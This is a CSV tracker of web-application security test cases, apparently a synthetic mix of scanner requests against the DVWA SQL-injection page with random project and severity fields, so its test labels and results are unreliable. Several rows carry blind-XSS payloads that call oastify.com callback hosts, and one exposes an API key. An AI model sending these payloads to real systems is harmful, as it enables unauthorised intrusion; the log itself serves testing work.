Deadline,Date of Test Executed,Project ID,Project Name,User ID,User Agent,Testing Scope,Test Case ID,Test Case,Test Case Status,Request Method,Requested Source,Test Case Outcome Message,Error Message,Actual Test Case Outcome,Reason for failure,Response Size,Findings (Affected Components),Severity ratings
05/10/2024,22/10/2024,PRJ-082,Web Application Contract Project,USER-015,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-001,Input Validation,Completed,GET,/v1/tiles,Fail,HTTP/2 204 No Content,,,,User profile page,Medium
24/10/2024,22/10/2024,PRJ-040,Web Application Contract Project,USER-074,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 z9iw5bxukg,APP,TC-744,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit&z9iw5bxukg=1,Pass,,,,4289,User profile page,Low
26/10/2024,22/10/2024,PRJ-030,Risk Management Analytics Contract Project,USER-058,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 rdebrbf6yj,WEB,TC-745,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit&rdebrbf6yj=1,Pass,,,,4289,User profile page,Critical
26/10/2024,22/10/2024,PRJ-044,Network Traffic Encryption (TLS/SSL) Contract Project,USER-071,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-746,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Database,Low
03/10/2024,22/10/2024,PRJ-012,ERP Reporting & Analytics Implementation Contract Project,USER-019,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-747,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Database,Low
24/10/2024,22/10/2024,PRJ-034,Mobile First Strategy Contract Project,USER-029,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-748,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Session management,Low
21/10/2024,22/10/2024,PRJ-050,Firewall Implementation Contract Project,USER-052,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-749,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Login form,Medium
07/10/2024,22/10/2024,PRJ-064,Remote Work Security Contract Project,USER-057,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-750,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Session management,High
12/10/2024,22/10/2024,PRJ-005,Customer Experience Enhancement Contract Project,USER-077,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-751,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/index.php/a9uo8q/d9v4z2/ksz8bo/?id=1&Submit=Submit,Pass,,,,4289,User profile page,Low
25/10/2024,22/10/2024,PRJ-031,Sales Performance Optimization Contract Project,USER-084,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-752,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Login form,High
17/10/2024,22/10/2024,PRJ-052,Denial of Service (DoS) Attack Contract Project,USER-046,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-753,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Session management,Medium
24/10/2024,22/10/2024,PRJ-002,Compliance (HIPAA) Contract Project,USER-095,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-754,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Session management,High
20/10/2024,22/10/2024,PRJ-072,Sales Performance Optimization Contract Project,USER-075,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-755,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Payment gateway,Medium
06/10/2024,22/10/2024,PRJ-025,Insider Threat Awareness Contract Project,USER-059,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3",APP,TC-756,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Login form,High
11/10/2024,22/10/2024,PRJ-053,Data Migration & Integration Contract Project,USER-065,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-757,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/index.php/a9uo8q/dvwa/css/main.css,Pass,,,,4230,Login form,High
23/10/2024,22/10/2024,PRJ-015,File Encryption Contract Project,USER-066,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-758,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Session management,High
22/10/2024,22/10/2024,PRJ-057,Mobile First Strategy Contract Project,USER-049,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-759,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Payment gateway,Critical
03/10/2024,22/10/2024,PRJ-059,Supply Chain Optimization Contract Project,USER-076,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-760,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Login form,High
31/10/2024,22/10/2024,PRJ-049,Virtual Private Network (VPN) Deployment Contract Project,USER-082,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-761,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=g3k35cfuy7mx8efrsq5vad67mysvgp4hw5nsdg2&Submit=Submit,Pass,,,,4230,Payment gateway,Critical
03/10/2024,22/10/2024,PRJ-046,Distributed Denial of Service (DDoS) Protection Contract Project,USER-067,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-762,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=if15herwa9yzkgrt4shxmfi9y04xsrgj87zuqif,Pass,,,,4289,User profile page,High
16/10/2024,22/10/2024,PRJ-052,Denial of Service (DoS) Attack Contract Project,USER-087,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-763,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Fail,HTTP/1.1 302 Found,,,152,Session management,Medium
31/10/2024,22/10/2024,PRJ-041,Platform as a Service (PaaS) Contract Project,USER-046,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-764,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/index.php,Pass,,,,4417,Payment gateway,Medium
24/10/2024,22/10/2024,PRJ-096,Wireless Network Contract Project,USER-088,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-765,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Fail,HTTP/1.1 302 Found,,,0,User profile page,Medium
27/10/2024,22/10/2024,PRJ-031,Sales Performance Optimization Contract Project,USER-034,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-766,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/../../login.php,Pass,,,,1342,User profile page,Medium
22/10/2024,22/10/2024,PRJ-080,Insider Threat Awareness Contract Project,USER-046,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-767,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit&k3o75gfyybm18ifvsu5zah6bm2szgt4lw9qwgk5=1,Pass,,,,4289,Login form,Low
12/10/2024,22/10/2024,PRJ-085,Mobile Device Encryption Contract Project,USER-064,2hkpjytgct0jm0td6cjhozkt0k6hubi3ar5ev2k,WEB,TC-768,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Login form,Critical
06/10/2024,22/10/2024,PRJ-080,Insider Threat Awareness Contract Project,USER-041,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-769,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Payment gateway,Critical
02/10/2024,22/10/2024,PRJ-098,Remote Work Enablement Contract Project,USER-066,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-770,SQL Injection,Completed,GET,/0nonpwzeir6hsyzbcapfuxqr6icf09o1gpdc30s/vulnerabilities/sqli/?id=1&Submit=Submit,Fail,HTTP/1.1 404 Not Found,,,271,User profile page,Medium
13/10/2024,22/10/2024,PRJ-068,Cloud Environment Contract Project,USER-055,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-771,XSS,Completed,GET,/DVWA/6rytt23kmxanw43hggtly3uxaogl4fs7kvhi86x/sqli/?id=1&Submit=Submit,Fail,HTTP/1.1 404 Not Found,,,271,Login form,High
11/10/2024,22/10/2024,PRJ-088,Data-Driven Decision Making Contract Project,USER-023,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-772,Authentication,Completed,GET,/DVWA/vulnerabilities/suqfwo66pjd9zq63j2w71pxjdaj771vtnhk4cs1/?id=1&Submit=Submit,Fail,HTTP/1.1 404 Not Found,,,271,Session management,Critical
11/10/2024,22/10/2024,PRJ-089,Customer Behavior Analysis Contract Project,USER-002,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-773,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Database,Low
08/10/2024,22/10/2024,PRJ-047,Security and Compliance Contract Project,USER-079,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-774,Authorization,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Session management,High
14/10/2024,22/10/2024,PRJ-035,Internal Systems Contract Project,USER-061,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-775,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id='%22%3e%3csvg%2fonload%3dfetch%60%2f%2f0hinjwtecr0hmytb6ajfoxkr0i6fu9i18pzcp0e%5c.oastify.com%60%3e&Submit=Submit,Pass,,,,637,User profile page,Critical
15/10/2024,22/10/2024,PRJ-027,Denial of Service (DoS) Attack Contract Project,USER-054,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-776,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fd7l099jr24qucbjown9seaa4qvwskm8ez2qpgd5X%3b.oastify.com%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e&Submit=Submit,Pass,,,,631,Database,High
24/10/2024,22/10/2024,PRJ-024,ERP Reporting & Analytics Implementation Contract Project,USER-074,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-777,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit='%22%3e%3csvg%2fonload%3dfetch%60%2f%2fkzn71gbyubi14ibvou1z6h2bi2ozct0lq9hw8kx%5c.oastify.com%60%3e,Pass,,,,4289,User profile page,Low
26/10/2024,22/10/2024,PRJ-035,Internal Systems Contract Project,USER-031,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-778,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fkd17fgpy8bw1iipv2ufzkhgbw22zqtel59wwnkcX%3b.oastify.com%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e,Pass,,,,4289,User profile page,Medium
16/10/2024,22/10/2024,PRJ-095,Network Segmentation Contract Project,USER-020,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-779,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Fail,HTTP/1.1 302 Found,,,152,User profile page,Critical
18/10/2024,22/10/2024,PRJ-018,ERP Security Enhancement Contract Project,USER-081,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-780,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/index.php,Pass,,,,4417,Payment gateway,High
07/10/2024,22/10/2024,PRJ-073,Wireless Network Security Contract Project,USER-007,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-781,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Fail,HTTP/1.1 302 Found,,,152,User profile page,Low
12/10/2024,22/10/2024,PRJ-033,Mobile Device Encryption Contract Project,USER-061,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-782,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/index.php,Pass,,,,4417,Payment gateway,High
04/10/2024,22/10/2024,PRJ-047,Security and Compliance Contract Project,USER-072,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-783,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Fail,HTTP/1.1 302 Found,,,0,Login form,Critical
25/10/2024,22/10/2024,PRJ-045,Cloud-Based ERP Upgrade Contract Project,USER-087,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-784,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/../../login.php,Pass,,,,1342,Session management,Medium
29/10/2024,22/10/2024,PRJ-037,Business Process Automation Contract Project,USER-046,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-785,XSS,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Fail,HTTP/1.1 302 Found,,,0,Database,Critical
21/10/2024,22/10/2024,PRJ-011,ERP Data Migration Project Contract Project,USER-049,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-786,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/../../login.php,Pass,,,,1342,User profile page,Medium
11/10/2024,22/10/2024,PRJ-044,Network Traffic Encryption (TLS/SSL) Contract Project,USER-054,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-787,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit&'%22%3e%3csvg%2fonload%3dfetch%60%2f%2f031n5wfeyrmh8yfbsa5fax6rmisfg941upoce03%5c.oastify.com%60%3e=1,Pass,,,,4289,Login form,Medium
09/10/2024,22/10/2024,PRJ-030,Risk Management Analytics Contract Project,USER-041,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-788,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit&javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fe4j16agsz5nv9cgpto6tbb75nwtthn5fw3qqge5X%3b.oastify.com%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,Pass,,,,4289,Payment gateway,Critical
28/10/2024,22/10/2024,PRJ-057,Mobile First Strategy Contract Project,USER-047,"'""><svg/onload=fetch`//4rwrt03imvalw23fgetjy1uvamgj4ds5itdg34s\.oastify.com`>",APP,TC-789,SQL Injection,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,User profile page,Medium
06/10/2024,22/10/2024,PRJ-003,Virtual Private Network (VPN) Deployment Contract Project,USER-017,"javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/uechgqq89lxbjsq534g9lrhlxc39r3fv6j16rugX;.oastify.com/).replace(/.;/g,[])]//'src=>",WEB,TC-790,Input Validation,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Login form,Medium
01/10/2024,22/10/2024,PRJ-051,ERP Security Enhancement Contract Project,USER-014,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-791,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Database,Low
03/10/2024,22/10/2024,PRJ-099,Network Infrastructure Contract Project,USER-051,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-792,Authentication,Completed,GET,/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit,Pass,,,,4289,Payment gateway,Medium
15/10/2024,22/10/2024,PRJ-084,Cost Optimization Contract Project,USER-050,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-793,Authorization,Completed,GET,/'%22%3e%3csvg/onload%3dfetch%60//jj66lfvxea20ohvu8tlyqgma218ywskka87vxjm%5c.oastify.com%60%3e/vulnerabilities/sqli/?id=1&Submit=Submit,Fail,HTTP/1.1 404 Not Found,,,271,User profile page,High
02/10/2024,22/10/2024,PRJ-081,Software as a Service (SaaS) Contract Project,USER-017,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-794,XSS,Completed,GET,/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/143o6xgfzsni9zgctb6gby7snjtgha52wqtdj18X%3b.oastify.com/).replace(/.%3b/g%2c[])]//'src%3d%3e/vulnerabilities/sqli/?id=1&Submit=Submit,Fail,HTTP/1.1 404 Not Found,,,271,User profile page,Low
18/10/2024,22/10/2024,PRJ-085,Mobile Device Encryption Contract Project,USER-046,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-795,SQL Injection,Completed,GET,/DVWA/'%22%3e%3csvg/onload%3dfetch%60//qa4dcmm45ht7fom1z0c5hndht8z5nzbr1fy2pqe%5c.oastify.com%60%3e/sqli/?id=1&Submit=Submit,Fail,HTTP/1.1 404 Not Found,,,271,Database,High
21/10/2024,22/10/2024,PRJ-057,Mobile First Strategy Contract Project,USER-018,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-796,XSS,Completed,GET,/DVWA/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/kc07egoy7bv1hiov1uezjhfbv21zptdl491wskhX%3b.oastify.com/).replace(/.%3b/g%2c[])]//'src%3d%3e/sqli/?id=1&Submit=Submit,Fail,HTTP/1.1 404 Not Found,,,271,Session management,Critical
30/10/2024,22/10/2024,PRJ-096,Wireless Network Contract Project,USER-082,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,APP,TC-797,XSS,Completed,GET,/DVWA/vulnerabilities/'%22%3e%3csvg/onload%3dfetch%60//77cu93jl2yqoc5jiwh9me4ayqpwmkg88ywvjn7c%5c.oastify.com%60%3e/?id=1&Submit=Submit,Fail,HTTP/1.1 404 Not Found,,,271,Session management,High
12/10/2024,22/10/2024,PRJ-045,Cloud-Based ERP Upgrade Contract Project,USER-062,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-798,Authentication,Completed,GET,/DVWA/vulnerabilities/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/oh9bjkt2cf05mmtz6yj3olkf0663uxip9d60yonX%3b.oastify.com/).replace(/.%3b/g%2c[])]//'src%3d%3e/?id=1&Submit=Submit,Fail,HTTP/1.1 404 Not Found,,,271,Database,High
17/10/2024,,PRJ-053,Data Migration & Integration Contract Project,USER-034,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,WEB,TC-799,Input Validation,Completed,GET,/v4/threatListUpdates:fetch?$ct=application/x-protobuf&key=AIzaSyD3uzXks34szqk9WhKoFZypVPgdDbT3uPw&$httpMethod=POST&$req=ChUKE25hdmNsaWVudC1hdXRvLWZmb3gaJwgFEAIaGwoNCAUQBhgBIgMwMDEwARDViRkaAhgKlKTt2SICIAIoARonCAEQAhobCg0IARAGGAEiAzAwMTABEO6pDxoCGArJQeqoIgIgAigBGicIAxACGhsKDQgDEAYYASIDMDAxMAEQmaEPGgIYCnHksPYiAiACKAEaJwgHEAIaGwoNCAcQBhgBIgMwMDEwARD97w8aAhgK2MLXIyICIAIoARolCAkQAhoZCg0ICRAGGAEiAzAwMTABECMaAhgKX9GWVCICIAIoAQ==,,,,,,Login form,Low
23/10/2024,,PRJ-098,Remote Work Enablement Contract Project,USER-018,,APP,TC-800,Input Validation,Not Started,,,,,,,,Database,Low
26/10/2024,,PRJ-063,Platform as a Service (PaaS) Contract Project,USER-097,,APP,TC-801,Input Validation,Not Started,,,,,,,,Login form,Critical
07/10/2024,,PRJ-038,Cloud Storage Encryption Contract Project,USER-077,,WEB,TC-802,Authentication,Not Started,,,,,,,,Session management,High
23/10/2024,,PRJ-053,Data Migration & Integration Contract Project,USER-072,,APP,TC-803,SQL Injection,Not Started,,,,,,,,User profile page,Medium
03/10/2024,,PRJ-095,Network Segmentation Contract Project,USER-083,,APP,TC-804,SQL Injection,Not Started,,,,,,,,User profile page,High
10/10/2024,,PRJ-055,Mobile Application Contract Project,USER-081,,WEB,TC-805,XSS,Not Started,,,,,,,,Session management,High
06/10/2024,,PRJ-084,Cost Optimization Contract Project,USER-096,,APP,TC-806,SQL Injection,Not Started,,,,,,,,User profile page,Low
09/10/2024,,PRJ-018,ERP Security Enhancement Contract Project,USER-038,,WEB,TC-807,SQL Injection,Not Started,,,,,,,,Session management,Critical
05/10/2024,,PRJ-090,Wireless Network Contract Project,USER-080,,APP,TC-808,Authorization,Not Started,,,,,,,,Payment gateway,Low
09/10/2024,,PRJ-007,Infrastructure as a Service (IaaS) Contract Project,USER-069,,WEB,TC-809,Authorization,Not Started,,,,,,,,Login form,High
05/10/2024,,PRJ-017,Internal Systems Contract Project,USER-092,,APP,TC-810,Authentication,Not Started,,,,,,,,User profile page,Low
26/10/2024,,PRJ-002,Compliance (HIPAA) Contract Project,USER-064,,WEB,TC-811,Input Validation,Not Started,,,,,,,,Database,High
27/10/2024,,PRJ-064,Remote Work Security Contract Project,USER-048,,APP,TC-812,Authentication,Not Started,,,,,,,,Payment gateway,Low
18/10/2024,,PRJ-097,ERP Customization & Integration Contract Project,USER-019,,WEB,TC-813,Input Validation,Not Started,,,,,,,,Database,Low
04/10/2024,,PRJ-061,Marketing Campaign Effectiveness Contract Project,USER-024,,WEB,TC-814,Input Validation,Not Started,,,,,,,,Database,Low
24/10/2024,,PRJ-099,Network Infrastructure Contract Project,USER-092,,WEB,TC-815,SQL Injection,Not Started,,,,,,,,Database,Medium
16/10/2024,,PRJ-005,Customer Experience Enhancement Contract Project,USER-026,,APP,TC-816,Authentication,Not Started,,,,,,,,Session management,Medium
24/10/2024,,PRJ-050,Firewall Implementation Contract Project,USER-088,,APP,TC-817,Input Validation,Not Started,,,,,,,,User profile page,Low
07/10/2024,,PRJ-071,E-commerce Platform Development Contract Project,USER-067,,WEB,TC-818,Input Validation,Not Started,,,,,,,,Database,High
11/10/2024,,PRJ-047,Security and Compliance Contract Project,USER-007,,WEB,TC-819,Authentication,Not Started,,,,,,,,User profile page,Critical
26/10/2024,,PRJ-002,Compliance (HIPAA) Contract Project,USER-022,,APP,TC-820,XSS,Not Started,,,,,,,,Login form,Critical
12/10/2024,,PRJ-032,Intrusion Detection/Prevention System (IDS/IPS) Contract Project,USER-002,,WEB,TC-821,XSS,Not Started,,,,,,,,Database,Medium
22/10/2024,,PRJ-099,Network Infrastructure Contract Project,USER-012,,WEB,TC-822,Authorization,Not Started,,,,,,,,Database,Low
23/10/2024,,PRJ-080,Insider Threat Awareness Contract Project,USER-044,,WEB,TC-823,Authentication,Not Started,,,,,,,,Payment gateway,Medium
18/10/2024,,PRJ-069,Infrastructure as a Service (IaaS) Contract Project,USER-014,,WEB,TC-824,SQL Injection,Not Started,,,,,,,,User profile page,High
23/10/2024,,PRJ-083,Application Modernization Contract Project,USER-097,,APP,TC-825,SQL Injection,Not Started,,,,,,,,User profile page,Low
